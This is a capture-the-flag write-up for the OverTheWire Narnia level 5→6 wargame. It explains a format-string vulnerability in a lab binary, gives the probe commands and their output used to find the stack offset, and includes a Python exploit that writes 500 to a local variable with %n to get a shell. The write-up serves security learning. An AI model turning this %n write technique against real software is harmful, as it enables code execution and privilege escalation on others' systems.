# OverTheWire — Narnia Level 5 → 6

> Goal: Get narnia6 password from `narnia5`. Result: **`**********`** (hidden)
> Technique: **format string** vulnerability → write 500 to local `i` using `%n`.

---

## 1. Connection
```bash
ssh narnia5@narnia.labs.overthewire.org -p 2226
```

## 2. Source
```c
int i = 1;
char buffer[64];
snprintf(buffer, sizeof buffer, argv[1]);   // BUG: format string = argv[1] (not stdin)
if(i == 500){ printf("GOOD\n"); system("/bin/sh"); }
printf("i = %d (%p)\n", i, &i);             // program PRINTS &i (a gift)
```

## 3. Vulnerability
`snprintf(buf,64,argv[1])` → we supply the format string. `%x` reads from the stack, `%n`
**writes to an address on the stack**. The program prints `&i` every run → no address guessing.
Even if `snprintf` truncates at 64, `%n` gets the **full counter** (glibc) → `%.496x` writes 500.

## 4. Offset — probe (**VERIFIED = 1**, NOT 5 as the walkthrough says!)
```bash
/narnia/narnia5 'AAAA.%1$x.%2$x.%3$x.%4$x.%5$x.%6$x.%7$x.%8$x'
# buffer : [AAAA.41414141.f7fc602e.0.0.0.0.0.0] (34)
#                ^^^^^^^^ %1$x = 41414141  =>  offset = 1
```
> ⚠️ **Live finding:** The walkthrough says offset **5**; in this binary our input appears at
> **%1$** → offset **1**. Tried `%5$n` first (wrote to the wrong slot, `i` stayed 1, no shell),
> corrected to 1 via probe.

## 5. Exploit
Read `&i` from the program's own `%p` output (with the final payload length, without crashing):
```python
import subprocess, struct, time, sys, re
# 1) leak: non-writing, same length as final (4 + "%.496x%1$x")
leak = subprocess.run([b'/narnia/narnia5', b'BBBB%.496x%1$x'], capture_output=True)
iaddr = int(re.search(r'i = 1 \(0x([0-9a-f]+)\)', out).group(1), 16)   # e.g. ffffd3a0
# 2) exploit: 4 (address) + %.496x = 500  ->  %1$n  ->  i = 500
payload = struct.pack('<I', iaddr) + b'%.496x%1$n'
# narnia5 doesn't wipe env -> PATH exists -> cat works; timed stdin for command
```
Output: `... GOOD` → `uid=14006(narnia6)` → password.

> 💡 **Why `%1$x` (leak) then `%1$n` (exploit)?** Both are **the same length** (`x`/`n`),
> so `&i` is identical in both calls. Using `%n` during the leak would write to a junk address
> → **segfault** and you'd never see the `&i` line.
> **bytes argv:** Python `subprocess` accepts **bytes args** in POSIX → address bytes
> (0xff etc.) aren't corrupted by utf-8 encoding.



## Lessons
| Topic | Note |
|-------|------|
| format string `%n` | `snprintf(buf,n,argv[1])` → write to arbitrary address |
| offset = 1 | **probe it**; walkthrough says 5, real is 1 (depends on binary version) |
| &i is a gift | The program prints it via `%p` → read from output, no leak needed |
| leak ≡ exploit length | `%1$x` vs `%1$n` same length → `&i` stays fixed |
| `snprintf` truncates | `%n` still gets full counter → 500 written despite 64-byte buffer |
